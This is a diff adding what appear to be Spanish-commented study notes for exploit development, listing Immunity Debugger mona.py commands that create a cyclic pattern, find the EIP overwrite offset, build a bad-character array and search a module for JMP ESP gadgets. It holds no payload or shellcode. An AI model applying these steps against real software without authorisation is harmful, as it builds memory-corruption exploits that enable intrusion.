@@ -1,0 +1,17 @@
+# fuzzer.py
+!mona pattern_create 1800
+
+# offset1.py - sobreescribiendo EIP
+!mona pattern_offset 36684335
+
+# buscando badchars
+!mona bytearray
+
+# buscar instruccion de salto a ESP
+!mona jmp -r esp
+
+# buscar direccion de memoria que no contenga el badchars "\x00"
+!mona jmp -r esp -cpb "\x00"
+
+# listar modulos cargados
+!mona find -s "\xff\xe4" -m programa.dll
